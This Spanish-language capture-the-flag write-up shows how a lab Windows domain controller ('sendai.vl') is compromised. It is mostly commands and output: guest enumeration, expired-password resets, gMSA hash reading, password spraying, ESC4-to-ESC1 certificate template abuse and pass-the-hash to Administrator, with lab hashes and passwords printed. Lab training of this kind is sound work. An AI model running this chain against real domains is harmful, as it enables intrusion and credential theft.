>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.234.66     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 10:43 EST
Nmap scan report for 10.129.234.66
Host is up (0.064s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-28 15:43:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49795/tcp open  msrpc         Microsoft Windows RPC
49817/tcp open  msrpc         Microsoft Windows RPC
50314/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50315/tcp open  msrpc         Microsoft Windows RPC
50329/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.58 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.234.66 sendai.vl DC dc.sendai.vl" >> /etc/hosts
```

>Vemos enumerando con netexec que el **Anonymous login** está permitido:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.234.66 -u '' -p ''               
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\:
```

>Enumeramos con netexec mediante la técnica **RID Brute-Force** los usuarios del dominio usando **Guest Login**:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.234.66 -u 'guest' -p '' --rid-brute
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```

>Enumeramos shares por SMB empleando Guest Login:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.234.66 -u 'guest' -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config                          
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
```

>Entramos a la Share **sendai** y vemos un archivo **incident.txt** que nos dice que a todos los usuarios le han expirado las credenciales:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ smbclient -U "guest" '\\10.129.234.66\sendai'             
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 18 13:31:04 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  hr                                  D        0  Tue Jul 11 08:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
  it                                  D        0  Tue Jul 18 09:16:46 2023
  legal                               D        0  Tue Jul 11 08:58:23 2023
  security                            D        0  Tue Jul 18 09:17:35 2023
  transfer                            D        0  Tue Jul 11 09:00:20 2023

		7019007 blocks of size 4096. 860750 blocks available
smb: \> get incident.txt
getting file \incident.txt of size 1372 as incident.txt (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ cat incident.txt          
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```

>Al probar contraseña vacía con todos los users vemos que hay 2 que piden un cambio de contraseña **STATUS_PASSWORD_MUST_CHANGE** en lugar de dar un **STATUS_LOGON_FAILURE**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ nxc smb 10.129.234.66 -u users -p '' --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
<SNIP>
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
<SNIP>
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
```

>Cambiamos las contraseñas de **Thomas.Powell** y **Elliot.Yates** gracias a esto ya que las credenciales están expiradas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ impacket-changepasswd 'sendai.vl/elliot.yates:'@10.129.234.66 -newpass 'Password123$!' -p rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of sendai.vl\elliot.yates
[*] Connecting to DCE/RPC as sendai.vl\elliot.yates
[*] Password was changed successfully.
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ impacket-changepasswd 'sendai.vl/thomas.powell:'@10.129.234.66 -newpass 'Password123$!' -p rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of sendai.vl\thomas.powell
[*] Connecting to DCE/RPC as sendai.vl\thomas.powell
[*] Password was changed successfully.
```

>Obtenemos **TGT** de los usuarios (paso opcional):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ impacket-getTGT 'sendai.vl/thomas.powell:Password123$!' -dc-ip 10.129.234.66                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in thomas.powell.ccache
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ impacket-getTGT 'sendai.vl/elliot.yates:Password123$!' -dc-ip 10.129.234.66
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in elliot.yates.ccache
```

>Obtenemos archivos de **bloodhound**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ bloodhound-ce-python -u 'thomas.powell' -p 'Password123$!' -k -ns 10.129.234.66 -d sendai.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sendai.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.sendai.vl:88)] [Errno 113] No route to host
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Testing resolved hostname connectivity dead:beef::7693:d534:5e62:7150
INFO: Trying LDAP connection to dead:beef::7693:d534:5e62:7150
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Testing resolved hostname connectivity dead:beef::7693:d534:5e62:7150
INFO: Trying LDAP connection to dead:beef::7693:d534:5e62:7150
INFO: Found 27 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sendai.vl
INFO: Done in 00M 14S
INFO: Compressing output into 20251228110544_bloodhound.zip
```

>El usuario **Thomas.Powell** posee la ACE **GenericAll** sobre la OU **ADMSVC** y sobre el grupo **ADMSVC** :

<img width="511" height="321" alt="image" src="https://github.com/user-attachments/assets/da5149a3-595d-436e-9c69-0fa6407f0cd0" />

>El usuario **Elliot.Yates** posee la ACE **GenericAll** sobre la OU **ADMSVC** y sobre el grupo **ADMSVC** :

<img width="485" height="241" alt="image" src="https://github.com/user-attachments/assets/9a2a367e-aff2-4b04-a10b-bd8819b767d8" />

>Aprovechamos la ACE **GenericAll** sobre el grupo **ADMSVC** para agregar a **Thomas.Powell** a ese grupo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ bloodyAD --host dc.sendai.vl -u 'thomas.powell' -p 'Password123$!' add groupMember ADMSVC thomas.powell
[+] thomas.powell added to ADMSVC
```

>Vemos que el grupo **ADMSVC** tiene la ACE **ReadGMSAPassword** sobre la cuenta de máquina **MGTSVC$**: 

<img width="936" height="148" alt="image" src="https://github.com/user-attachments/assets/3fb22959-0b2e-451a-916a-356b480757e9" />

>Vamos a obtener su **contraseña GMSA** y vemos su hash NT `2579ff83767013c18bbec6e84ffea6f9`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ bloodyAD --host dc.sendai.vl -u 'thomas.powell' -p 'Password123$!' get object MGTSVC\$ --attr msDS-ManagedPassword  

distinguishedName: CN=mgtsvc,CN=Managed Service Accounts,DC=sendai,DC=vl
msDS-ManagedPassword.NT: 2579ff83767013c18bbec6e84ffea6f9
msDS-ManagedPassword.B64ENCODED: wJx6EZ06vx67AUE5ZS417M4if+eAFqpDMFOg0nSa1gaRVqOVW76GZe+XXueFGGHSZDXusns5OG7/hQSpTDXC53CSIlw/k6E20bIdx/3BoJvm5OjoQAz6yuHoEqp+8NJQcp8O9HXnMVD8eT8iUb2yUXDfHj+oV9NPkpF2IT7nk6tmzJ8IqfUxj9fI6D1nMB/BHvzWd8/2vuPmgI5OqGFh9cpUHc+H0f+sDdxrt5X7jY8gxYMZswpD+BwGumjFzXrGGPIfBjwkvUTqPcZcG57x1fJWHxT9uTPpiYtExYKqxFOpa8lSz6UqjmnWbq37PNBYowJYuwpjf30GDsF6jW/JKA==
```

>Vemos que pertenece a **Remote Management Users** así que podemos usar esta cuenta para acceder mediante **WinRM**:

<img width="700" height="148" alt="image" src="https://github.com/user-attachments/assets/62dc45cd-6347-494a-906b-d590edbb96ee" />

>Accedemos mediante **WinRM** y leemos la user flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ evil-winrm -i dc.sendai.vl -u MGTSVC\$ -H 2579ff83767013c18bbec6e84ffea6f9
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd C:\
*Evil-WinRM* PS C:\> cat user.txt
fff335936142d21a6fa44123b897cd3e
```

>Vemos unas credenciales de **MSSQL** en `C:\config\.sqlconfig`:

```powershell
*Evil-WinRM* PS C:\config> cat .sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

>Hacer **password spray** nos muestra que solo el usuario **sqlsvc** tiene esas credenciales:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ kerbrute passwordspray -d sendai.vl users --dc 10.129.234.66 -t 300 'SurenessBlob85'         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/28/25 - Ronnie Flathers @ropnop

2025/12/28 11:27:59 >  Using KDC(s):
2025/12/28 11:27:59 >  	10.129.234.66:88

2025/12/28 11:27:59 >  [+] VALID LOGIN:	sqlsvc@sendai.vl:SurenessBlob85
2025/12/28 11:27:59 >  Done! Tested 27 logins (1 successes) in 0.281 seconds
```

>Si enumeramos la hive **HKLM:\SYSTEM\CurrentControlSet\services** vemos que hay un servicio que contiene las credenciales del usuario **clifford.davey**: `clifford.davey:RFmoB2WplgE_3p`

```bash
*Evil-WinRM* PS C:\Users\Public> dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"

<SNIP>

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}

<SNIP>
```

>Vemos que hay servicio de **ADCS**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ nxc ldap dc.sendai.vl -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -M adcs
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p 
ADCS        10.129.234.66   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.66   389    DC               Found PKI Enrollment Server: dc.sendai.vl
ADCS        10.129.234.66   389    DC               Found CN: sendai-DC-CA
ADCS        10.129.234.66   389    DC               Found PKI Enrollment WebService: https://dc.sendai.vl/sendai-DC-CA_CES_Kerberos/service.svc/CES
```

>Buscamos plantillas vulnerables con certipy y vemos que hay un **ESC4**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ certipy find -vulnerable -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target dc.sendai.vl -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\Domain Computers
                                          SENDAI.VL\ca-operators
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

>Gracias a la vulnerabilidad **ESC4**, nuestro usuario tiene los privilegios suficientes sobre la plantilla **SendaiComputer** para agregarle **EnrolleeSupplySubject** para que sea vulnerable a **ESC1** y así poder impersonar al **Administrador**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ certipy template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target dc.sendai.vl -template 'SendaiComputer' -write-default-configuration
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SendaiComputer.json'
[*] Wrote current configuration for 'SendaiComputer' to 'SendaiComputer.json'
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

>Obtenemos el **SID** del **Administrador**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ bloodyAD --host dc.sendai.vl -u 'thomas.powell' -p 'Password123$!' get object Administrator --attr ObjectSid

distinguishedName: CN=Administrator,CN=Users,DC=sendai,DC=vl
objectSid: S-1-5-21-3085872742-570972823-736764132-500
```

>Obtenemos un **certificado PFX** del **administrador** aprovechando el **ESC1** creado:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ certipy req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -template SendaiComputer -ca sendai-DC-CA -upn 'Administrator@sendai.vl' -sid 'S-1-5-21-3085872742-570972823-736764132-500' 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: SENDAI.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

>Nos **autenticamos** con el **certificado pfx** obtenido y ganamos el **hash** **NTLM** del **Administrador** del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ sudo ntpdate 10.129.234.66
[sudo] password for kali: 
2025-12-28 11:47:28.742218 (-0500) +1.215941 +/- 0.032774 10.129.234.66 s1 no-leap
CLOCK: time stepped by 1.215941
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

>Hacemos **Pass-The-Hash** y entramos por **WinRM** con el **Administrador** y obtenemos la root flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sendai]
└─$ evil-winrm -i dc.sendai.vl -u Administrator -H cfb106feec8b89a3d98e14dcbe8d087a
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
1bc134a7b4ae19fcc072082026d991cf
```
